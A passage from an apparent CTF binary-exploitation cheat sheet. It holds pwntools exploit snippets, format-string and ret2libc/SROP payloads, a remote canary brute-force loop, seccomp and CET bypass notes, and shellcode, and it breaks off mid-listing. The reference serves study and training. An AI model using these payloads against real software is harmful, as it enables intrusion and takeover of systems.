+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p = gdb.debug(<span class="string">&quot;./vuln&quot;</span>, gdbscript=<span class="string">&quot;b *main+1\nc&quot;</span>)</span><br><span class="line">p.send(cyclic(<span class="number">123</span>))</span><br><span class="line">offset = cyclic_find(<span class="number">0x6161616a</span>) <span class="comment"># Finds &#x27;jaaa&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> IPython</span><br><span class="line">IPython.embed() <span class="comment"># Launch IPython</span></span><br><span class="line"><span class="comment"># leak  = u64(p.recvline(keepends=False).ljust(8, b&#x27;\x00&#x27;))</span></span><br><span class="line"></span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line">sc = asm(shellcraft.cat(<span class="string">&quot;/flag&quot;</span>))</span><br><span class="line">sc = asm(shellcraft.chmod(<span class="string">&quot;/flag&quot;</span>, <span class="number">0o444</span>))</span><br></pre></td></tr></table></figure>
+<p>View shellcraft:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwn shellcraft -l</span><br><span class="line"><span class="comment"># Output format (default: hex), choose from &#123;e&#125;lf, &#123;r&#125;aw, &#123;s&#125;tring, &#123;c&#125;-style array, &#123;h&#125;ex string, hex&#123;i&#125;i, &#123;a&#125;ssembly code, &#123;p&#125;reprocessed code, escape&#123;d&#125; hex string</span></span><br><span class="line">pwn shellcraft amd64.linux.sh -f d</span><br></pre></td></tr></table></figure>
+<h3 id="de-bruijn-sequence-cyclic">De Bruijn Sequence (Cyclic)</h3>
+<p>A De Bruijn sequence <span class="math inline">\(B(k, n)\)</span> is
+a cyclic sequence where every possible string of length <span
+class="math inline">\(n\)</span> over an alphabet of size <span
+class="math inline">\(k\)</span> appears exactly once.</p>
+<ul>
+<li><strong>Why it's used</strong>: When a <code>binary</code> crashes
+due to a <code>buffer overflow</code>, the <code>RIP</code> will be
+overwritten by a 4 or 8-byte chunk of the sequence. Since every chunk is
+unique, <code>cyclic_find</code> can instantly determine the exact
+<code>offset</code> needed for the exploit.</li>
+</ul>
+<p>Crash-offset workflow:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">p = process(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line">p.send(cyclic(<span class="number">300</span>))</span><br><span class="line">p.wait()</span><br><span class="line"></span><br><span class="line"><span class="comment"># In GDB/pwndbg, read overwritten RIP/RSP value, then:</span></span><br><span class="line">offset = cyclic_find(<span class="number">0x6161616c</span>)      <span class="comment"># 32-bit chunk</span></span><br><span class="line">offset = cyclic_find(p64(<span class="number">0x6161616c6161616b</span>), n=<span class="number">8</span>)</span><br></pre></td></tr></table></figure>
+<p>For 64-bit patterns, keep <code>n</code> consistent between
+generation and lookup if you use non-default subsequence size.</p>
+<h2 id="environment-control">Environment Control</h2>
+<ul>
+<li><strong>Disable ASLR for Debugging</strong>: <code>gdb</code>
+disables <code>ASLR</code> by default. For a clean environment, use
+<code>setarch x86_64 -R /bin/bash</code> to spawn a shell where all
+child processes (excluding SUID) have <code>ASLR</code> disabled.</li>
+<li><strong>SUID Trap</strong>: <code>gdb</code> cannot disable
+<code>ASLR</code> for SUID binaries due to kernel security. Remove the
+SUID bit (<code>chmod u-s</code>) or copy the <code>binary</code> to a
+local directory before debugging.</li>
+<li><strong>Global ASLR Toggle</strong>:
+<code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code>
+(Reset to <code>2</code> when finished).</li>
+</ul>
+<p>Environment affects stack addresses. <code>argv[0]</code> length,
+environment variables, terminal, and pwntools launching mode can shift
+stack buffers. Use <code>env={}</code> in <code>process()</code> or add
+a NOP sled when stack shellcode depends on approximate addresses.</p>
+<h1 id="information-disclosure-causes">Information Disclosure
+Causes</h1>
+<h2 id="string-termination-problems">String Termination Problems</h2>
+<p>C strings are <strong>null-terminated</strong>, meaning they lack
+length metadata and rely on a <code>0x00</code> byte to mark the
+end.</p>
+<ul>
+<li><strong>Missing Null byte</strong>: If a program reads exactly <span
+class="math inline">\(N\)</span> bytes into an <span
+class="math inline">\(N\)</span>-byte buffer (e.g., using
+<code>read()</code>), it won't append a <code>null byte</code>.</li>
+<li><strong>Disclosure</strong>: Functions like
+<code>printf("%s")</code> will continue reading past the buffer until
+they hit a <code>null byte</code>, potentially leaking adjacent
+sensitive data like a <code>flag</code> or <code>canary</code>.</li>
+</ul>
+<h2 id="uninitialized-data-stack-frame-reuse">Uninitialized Data (Stack
+Frame Reuse)</h2>
+<ul>
+<li><strong>Frame Persistence</strong>: When a function returns, its
+<code>stack</code> frame is not cleared. The <code>RSP</code> simply
+moves back up.</li>
+<li><strong>Ghost Data</strong>: If a subsequent function call allocates
+a frame over the same memory area and fails to initialize its variables,
+it can read or "leak" the "ghost" data left by the previous
+function.</li>
+</ul>
+<h2 id="compiler-backstabbing-dead-store-elimination">Compiler
+Backstabbing (Dead Store Elimination)</h2>
+<ul>
+<li><strong>The Trap</strong>: A developer might use
+<code>memset(buf, 0, size)</code> to clear a sensitive <code>flag</code>
+before a function returns.</li>
+<li><strong>DSE</strong>: If the compiler (with <code>-O2</code> or
+<code>-O3</code>) determines that <code>buf</code> is never accessed
+again before the function returns, it may "optimize out" the
+<code>memset</code> entirely, leaving the secret data on the
+<code>stack</code>. Use <code>-fno-inline</code> or specific memory
+barrier techniques to prevent this.</li>
+</ul>
+<h2 id="format-string-leaks">Format String Leaks</h2>
+<p><code>printf(user_input)</code> treats user bytes as a format string.
+This can leak stack/register values and, with <code>%n</code>, write
+memory.</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%p %p %p %p              # leak pointers</span><br><span class="line">%lx.%lx.%lx              # leak words</span><br><span class="line">%7$sAAAA&lt;addr&gt;           # read string from controlled address, offset depends on stack layout</span><br><span class="line">%hn / %hhn / %n          # write 2 / 1 / pointer-sized count</span><br></pre></td></tr></table></figure>
+<p>Pwntools helpers:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">offset = FmtStr(exec_fmt).offset</span><br><span class="line">payload = fmtstr_payload(offset, &#123;elf.got[<span class="string">&quot;printf&quot;</span>]: libc.sym[<span class="string">&quot;system&quot;</span>]&#125;)</span><br></pre></td></tr></table></figure>
+<p>Common path with writable GOT: leak a libc address, calculate
+<code>libc.address</code>, then overwrite
+<code>printf@GOT</code>/<code>puts@GOT</code> with <code>system</code>
+or an offset into <code>win</code>.</p>
+<h1 id="memory-corruption-primitives">Memory Corruption Primitives</h1>
+<h2 id="stack-buffer-overflow">Stack Buffer Overflow</h2>
+<p>Typical offset calculation:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">buf = rbp - 0x60</span><br><span class="line">saved RBP = rbp</span><br><span class="line">return address = rbp + 8</span><br><span class="line">offset_to_ret = 0x60 + 8</span><br></pre></td></tr></table></figure>
+<p>Ret2win payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;A&quot;</span> * offset_to_ret + p64(elf.sym[<span class="string">&quot;win&quot;</span>])</span><br></pre></td></tr></table></figure>
+<p>If <code>win_authed(token)</code> checks a stack/local token,
+sometimes jump past the check instead of calling the function entry.
+This is an <strong>offset jump</strong>. Make sure the target
+instruction does not depend on skipped setup.</p>
+<h2 id="canary-bypass-patterns">Canary Bypass Patterns</h2>
+<ul>
+<li><strong>Direct leak</strong>: program prints past the canary because
+the input overwrote its leading <code>\x00</code> terminator.</li>
+<li><strong>Residual stack leak</strong>: another function leaves a
+canary copy or secret in reused stack memory.</li>
+<li><strong>Recursive/retry path</strong>: trigger a path that re-enters
+vulnerable code before the outer canary is checked.</li>
+<li><strong>Fork brute-force</strong>: child crashes do not randomize
+parent canary; brute-force byte-by-byte.</li>
+<li><strong>Skip canary write zone</strong>: corrupt loop index,
+pointer, length, or destination so writes land after the canary.</li>
+</ul>
+<p>Stack canary on amd64 usually has a null low byte. Leak
+reconstruction often looks like:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">canary = u64(<span class="string">b&quot;\x00&quot;</span> + leak7)</span><br><span class="line">payload = flat(<span class="string">b&quot;A&quot;</span> * off, canary, <span class="string">b&quot;B&quot;</span> * <span class="number">8</span>, target)</span><br></pre></td></tr></table></figure>
+<h2 id="signedness-integer-bugs">Signedness &amp; Integer Bugs</h2>
+<p>Danger pattern: check in signed arithmetic, use in unsigned API.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> size;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line"><span class="keyword">if</span> (size &lt;= <span class="number">64</span>) &#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, size);   <span class="comment">// size converted to size_t</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>-1</code> passes <code>size &lt;= 64</code>, then becomes
+<code>0xffffffffffffffff</code> as <code>size_t</code>.</p>
+<p>Integer multiplication overflow:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> bytes = count * record_size;</span><br><span class="line"><span class="keyword">if</span> (bytes &lt;= <span class="keyword">sizeof</span>(buf)) read(<span class="number">0</span>, buf, count * record_size);</span><br></pre></td></tr></table></figure>
+<p>If multiplication truncates before the check but the later copy/read
+uses the larger semantic size, bounds checks fail.</p>
+<h2 id="oob-indexing">OOB Indexing</h2>
+<ul>
+<li>Negative index can read/write before an array.</li>
+<li>Positive overlarge index can reach later locals, heap metadata, GOT,
+vtables, function pointers, or adjacent objects.</li>
+<li>Convert byte distance to index by dividing by element size.</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index = (target_addr - array_base) // element_size</span><br></pre></td></tr></table></figure>
+<h2 id="partial-pointer-overwrite">Partial Pointer Overwrite</h2>
+<p>Partial overwrite changes only low bytes of a pointer. Useful when
+high bytes are stable due to page alignment or same mapping.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;A&quot;</span> * offset + p16(target_low_16)</span><br></pre></td></tr></table></figure>
+<p>This works best when source and destination are in the same
+module/stack/heap region or when only the low page offset must
+change.</p>
+<h2 id="got-overwrite">GOT Overwrite</h2>
+<p>Requirements:</p>
+<ul>
+<li>GOT target must be writable (<code>No RELRO</code> or sometimes
+<code>Partial RELRO</code>).</li>
+<li>A write primitive reaches the target GOT entry.</li>
+<li>The overwritten function is called after the overwrite.</li>
+</ul>
+<p>Common targets:</p>
+<ul>
+<li><code>printf@GOT -&gt; system</code>, then pass
+<code>"/bin/sh"</code> or a command string to <code>printf</code>.</li>
+<li><code>puts@GOT -&gt; win + offset</code>, but avoid recursion if
+<code>win</code> itself calls <code>puts</code> first.</li>
+</ul>
+<h2 id="heap-bug-classes">Heap Bug Classes</h2>
+<ul>
+<li><strong>UAF</strong>: use a pointer after <code>free</code>; can
+become type confusion if the freed chunk is reallocated as another
+object.</li>
+<li><strong>Double free</strong>: same chunk inserted into a free list
+twice; allocator-dependent exploitability.</li>
+<li><strong>Overflow into metadata/object</strong>: corrupt size, next
+pointer, function pointer, vtable, length, or data pointer.</li>
+<li><strong>Aliased backing store</strong>: a high-level view
+(<code>ArrayBuffer</code>, slice, sprite, ledger view) still references
+native heap memory after resize/free.</li>
+</ul>
+<p>Pwndbg commands:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">heap</span><br><span class="line">vis_heap_chunks</span><br><span class="line">bins</span><br><span class="line">tcachebins</span><br><span class="line">fastbins</span><br><span class="line">unsortedbin</span><br><span class="line">arena</span><br></pre></td></tr></table></figure>
+<h1 id="aslr-bypass-techniques">ASLR &amp; Bypass Techniques</h1>
+<h3 id="method-1-memory-leak">Method 1: Memory Leak</h3>
+<p>Despite <code>ASLR</code>, the <strong>relative
+<code>offset</code></strong> between functions and data within the same
+module remains constant.</p>
+<ol type="1">
+<li>Leak a known pointer (e.g., a function address in the
+<code>GOT</code>).</li>
+<li>Subtract its constant <code>offset</code> to find the base
+address.</li>
+<li>Calculate the addresses of all other gadgets/functions.</li>
+</ol>
+<h3 id="method-2-partial-overwrite-yolo">Method 2: Partial Overwrite
+(YOLO)</h3>
+<p>Memory is managed in <strong>pages</strong> (typically
+<code>0x1000</code> bytes). The lowest 12 bits of an address represent
+the page <code>offset</code> and are <strong>not</strong> randomized by
+<code>ASLR</code>.</p>
+<ul>
+<li><strong>Strategy</strong>: Overwrite only the least significant 1 or
+2 bytes of the <code>return address</code>. This allows redirecting
+execution to a different instruction within the same page (or nearby)
+without knowing the randomized base. Overwriting 2 bytes usually
+requires a 1/16 brute-force of the 4th nibble.</li>
+</ul>
+<h3 id="method-3-fork-brute-force">Method 3: Fork Brute-force</h3>
+<p>In a <code>fork()</code>-based network server, child processes
+inherit the <strong>exact memory layout</strong> of the parent,
+including <code>ASLR</code> offsets and the <code>canary</code>.</p>
+<ul>
+<li><strong>Strategy</strong>: Brute-force the <code>canary</code> or
+<code>return address</code> byte-by-byte. If the child crashes, the
+parent simply forks a new one with the same values, allowing for
+infinite attempts.</li>
+</ul>
+<p>Canary brute-force skeleton:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">canary = <span class="string">b&quot;\x00&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> guess <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        io = remote(<span class="string">&quot;host&quot;</span>, <span class="number">1337</span>)</span><br><span class="line">        payload = <span class="string">b&quot;A&quot;</span> * offset_to_canary + canary + <span class="built_in">bytes</span>([guess])</span><br><span class="line">        io.send(payload)</span><br><span class="line">        out = io.recvall(timeout=<span class="number">0.2</span>)</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;stack smashing detected&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> out <span class="keyword">and</span> <span class="string">b&quot;crash&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> out:</span><br><span class="line">            canary += <span class="built_in">bytes</span>([guess])</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<h3 id="method-4-ret2libc">Method 4: ret2libc</h3>
+<p>With NX enabled, call existing libc code instead of injecting
+code.</p>
+<ol type="1">
+<li>Leak a libc pointer, e.g. <code>puts(puts@GOT)</code>.</li>
+<li>Compute
+<code>libc.address = leaked_puts - libc.sym["puts"]</code>.</li>
+<li>Call <code>system("/bin/sh")</code> or <code>execve</code>
+gadgets.</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">rop = ROP(elf)</span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    <span class="string">b&quot;A&quot;</span> * offset,</span><br><span class="line">    rop.find_gadget([<span class="string">&quot;pop rdi&quot;</span>, <span class="string">&quot;ret&quot;</span>])[<span class="number">0</span>],</span><br><span class="line">    elf.got[<span class="string">&quot;puts&quot;</span>],</span><br><span class="line">    elf.plt[<span class="string">&quot;puts&quot;</span>],</span><br><span class="line">    elf.sym[<span class="string">&quot;main&quot;</span>],</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># receive leak, then second stage</span></span><br><span class="line">libc.address = leak - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">binsh = <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">payload = flat(</span><br><span class="line">    <span class="string">b&quot;A&quot;</span> * offset,</span><br><span class="line">    ret,                         <span class="comment"># optional stack alignment</span></span><br><span class="line">    pop_rdi,</span><br><span class="line">    binsh,</span><br><span class="line">    libc.sym[<span class="string">&quot;system&quot;</span>],</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<h3 id="method-5-ret2plt-ret2csu">Method 5: ret2plt / ret2csu</h3>
+<ul>
+<li><code>ret2plt</code>: call imported functions through PLT when the
+binary has useful PLT entries and controlled arguments.</li>
+<li><code>ret2csu</code>: use gadgets inside
+<code>__libc_csu_init</code> to populate <code>RDI</code>,
+<code>RSI</code>, <code>RDX</code> when simple <code>pop rdi; ret</code>
+/ <code>pop rsi; ret</code> gadgets are missing.</li>
+</ul>
+<p>Typical ret2csu idea:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gadget 1: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret</span><br><span class="line">gadget 2: mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8]</span><br></pre></td></tr></table></figure>
+<p>Set <code>rbx = 0</code>, <code>rbp = 1</code>,
+<code>r12 = function_pointer_table</code>, <code>r13 = arg1</code>,
+<code>r14 = arg2</code>, <code>r15 = arg3</code>.</p>
+<h3 id="method-6-srop">Method 6: SROP</h3>
+<p>Sigreturn-oriented programming uses a fake <code>rt_sigreturn</code>
+frame to set all registers. Useful when gadgets are scarce but you can
+execute <code>syscall</code> with <code>RAX = 15</code>
+(<code>rt_sigreturn</code>).</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = binsh</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall_ret</span><br><span class="line">payload = flat(<span class="string">b&quot;A&quot;</span> * offset, pop_rax, <span class="number">15</span>, syscall_ret, <span class="built_in">bytes</span>(frame))</span><br></pre></td></tr></table></figure>
+<h1 id="seccomp-notes">Seccomp Notes</h1>
+<p>If shellcode or ROP mysteriously dies on <code>execve</code>, check
+seccomp filters.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump ./chall</span><br><span class="line">strace ./chall</span><br></pre></td></tr></table></figure>
+<p>Common bypasses:</p>
+<ul>
+<li>If <code>execve</code> is blocked but file syscalls are allowed:
+<code>open</code>/<code>read</code>/<code>write</code> or
+<code>sendfile</code> the flag.</li>
+<li>If <code>open</code> is blocked but <code>openat</code> allowed: use
+<code>openat(AT_FDCWD, "/flag", 0)</code>.</li>
+<li>If only <code>read</code>, <code>write</code>, <code>exit</code>,
+<code>sigreturn</code> are allowed: consider SROP or staged ROP.</li>
+</ul>
+<h1 id="shellcoding">Shellcoding</h1>
+<h2 id="toolchain">Toolchain</h2>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Compile shellcode (static, no libc)</span></span><br><span class="line">gcc -nostdlib -static shellcode.s -o shellcode-elf</span><br><span class="line"></span><br><span class="line"><span class="comment"># Extract raw shellcode bytes</span></span><br><span class="line">objcopy --dump-section .text=shellcode-raw shellcode-elf</span><br><span class="line"></span><br><span class="line"><span class="comment"># Compile with RWX .text (for SMC)</span></span><br><span class="line">gcc -Wl,-N --static -nostdlib -o <span class="built_in">test</span> test.s</span><br></pre></td></tr></table></figure>
+<h2 id="forbidden-bytes">Forbidden Bytes</h2>
+<p>Avoid bytes that terminate or split input strings:</p>
+<table>
+<thead>
+<tr>
+<th>Byte</th>
+<th>Name</th>
+<th>Trigger</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>0x00</code></td>
+<td><code>null byte</code></td>
+<td><code>strcpy</code>, <code>printf</code> (Terminator)</td>
+</tr>
+<tr>
+<td><code>0x0a</code></td>
+<td><code>newline</code></td>
+<td><code>fgets</code>, <code>scanf</code> (End of Input)</td>
+</tr>
+<tr>
+<td><code>0x20</code></td>
+<td><code>space</code></td>
+<td><code>scanf</code> (Separator)</td>
+</tr>
+</tbody>
+</table>
+<h3 id="null-byte-avoidance-techniques">Null Byte Avoidance
+Techniques</h3>
+<table>
+<colgroup>
+<col style="width: 17%" />
+<col style="width: 34%" />
+<col style="width: 48%" />
+</colgroup>
+<thead>
+<tr>
+<th>Bad</th>
+<th>Good</th>
+<th>Reason</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>mov RAX, 0</code></td>
+<td><code>xor EAX, EAX</code></td>
+<td>Avoids long <code>null byte</code> sequence</td>
+</tr>
+<tr>
+<td><code>mov RAX, 5</code></td>
+<td><code>xor EAX, EAX; mov AL, 5</code></td>
+<td>Avoids <code>0x00</code> padding in 64-bit <code>mov</code></td>
+</tr>
+<tr>
+<td><code>mov RAX, 10</code></td>
+<td><code>push 9; pop RAX; inc RAX</code></td>
+<td>Avoids <code>0x0a</code> (<code>newline</code>)</td>
+</tr>
+</tbody>
+</table>
+<p>Other size/filter tricks:</p>
+<ul>
+<li>Use 32-bit register writes (<code>eax</code>, <code>edi</code>,
+<code>esi</code>) to avoid <code>REX.W</code> (<code>0x48</code>) and
+zero-extend into 64-bit registers.</li>
+<li>Use <code>push imm; pop reg</code> for small constants.</li>
+<li>Use <code>cdq</code> to zero/sign-fill <code>RDX</code> from
+<code>EAX</code> when <code>EAX</code> is positive.</li>
+<li>Store strings on the stack in little-endian order.</li>
+<li>XOR-encode constants to avoid bad bytes, then decode in-place.</li>
+<li>If shellcode is called through a register, inspect live registers
+before execution; they may point to the shellcode mapping and save bytes
+with <code>lea</code>.</li>
+</ul>
+<h2 id="nop-sled-stack-shellcode">NOP Sled &amp; Stack Shellcode</h2>
+<p>NOP sled (<code>\x90</code>) tolerates approximate jump targets. It
+is useful when stack addresses shift due to environment differences.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nop_sled = <span class="string">b&quot;\x90&quot;</span> * <span class="number">512</span></span><br><span class="line">shellcode = asm(shellcraft.cat(<span class="string">&quot;/flag&quot;</span>))</span><br><span class="line">payload = nop_sled + shellcode</span><br><span class="line">payload = payload.ljust(offset, <span class="string">b&quot;A&quot;</span>) + p64(approx_stack_addr)</span><br></pre></td></tr></table></figure>
+<p>Avoid stack self-destruction: after <code>ret</code>,
+<code>RSP</code> points just above the return address. Shellcode using
+<code>push</code> may overwrite nearby bytes below <code>RSP</code>.
+Place shellcode sufficiently before/after the overwritten return path or
+use a large sled.</p>
+<h2 id="staged-shellcode">Staged Shellcode</h2>
+<p>When input length is too small, first-stage shellcode reads a larger
+second stage into RWX memory or stack, then jumps there.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; read(0, rsp, 0x400); jmp rsp</span><br><span class="line">xor eax, eax</span><br><span class="line">xor edi, edi</span><br><span class="line">mov rsi, rsp</span><br><span class="line">mov dx, 0x400</span><br><span class="line">syscall</span><br><span class="line">jmp rsp</span><br></pre></td></tr></table></figure>
+<h2 id="self-modifying-code-smc">Self-Modifying Code (SMC)</h2>
+<p>Runtime modification of the <code>.text</code> segment to bypass
+static filters. Requires the segment to be writable
+(<code>-Wl,-N</code>).</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">; Bypassing &#x27;syscall&#x27; (0x0f05) filter</span><br><span class="line">inc BYTE PTR [RIP+1]</span><br><span class="line">.byte 0x0f</span><br><span class="line">.byte 0x04            ; Runtime: 0x04 -&gt; 0x05 (creating 0x0f05)</span><br></pre></td></tr></table></figure>
+<p>If the first page is made RX after input, place the patching code and
+patch targets on a later still-writable page, or use a first-stage jump
+over the protected region.</p>
+<h2 id="cet-shstk-ibt">CET: SHSTK &amp; IBT</h2>
+<p>Intel CET adds hardware CFI:</p>
+<ul>
+<li><strong>SHSTK (Shadow Stack)</strong>: return addresses are mirrored
+on a protected shadow stack. <code>ret</code> compares the normal stack
+return address against the shadow one. A classic saved-<code>RIP</code>
+overwrite can crash even when canary is disabled.</li>
+<li><strong>IBT (Indirect Branch Tracking)</strong>: indirect
+<code>call</code>/<code>jmp</code> targets must start with
+<code>endbr64</code> (<code>f3 0f 1e fa</code>).</li>
+<li><strong><code>notrack</code> prefix</strong>:
+<code>notrack jmp rax</code> can bypass IBT checks for that branch, so a
+corrupted function pointer/register may jump to shellcode or arbitrary
+code even when IBT is enabled.</li>
+</ul>
+<p>When <code>SHSTK</code> blocks ROP, look for:</p>
+<ul>
+<li>Non-return indirect branches: <code>jmp rax</code>,
+<code>call rax</code>, switch-table dispatch.</li>
+<li><code>notrack</code> jumps in compiler-generated switch code.</li>
+<li>Writable function pointers, vtables, callback tables, jump-table
+indexes.</li>
+<li>Logic bugs that reach <code>win</code> without hijacking
+<code>ret</code>.</li>
+</ul>
+<h2 id="reference-shellcodes">Reference Shellcodes</h2>
+<h3 id="x64-root-shell-no-rex.w0x48">x64 root shell (No REX.W/0x48)</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># Avoids \x48 (REX.W prefix)</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line"></span><br><span class="line">    /* 0. Set UID to root (setuid(0)) */</span><br><span class="line">    xor edi, 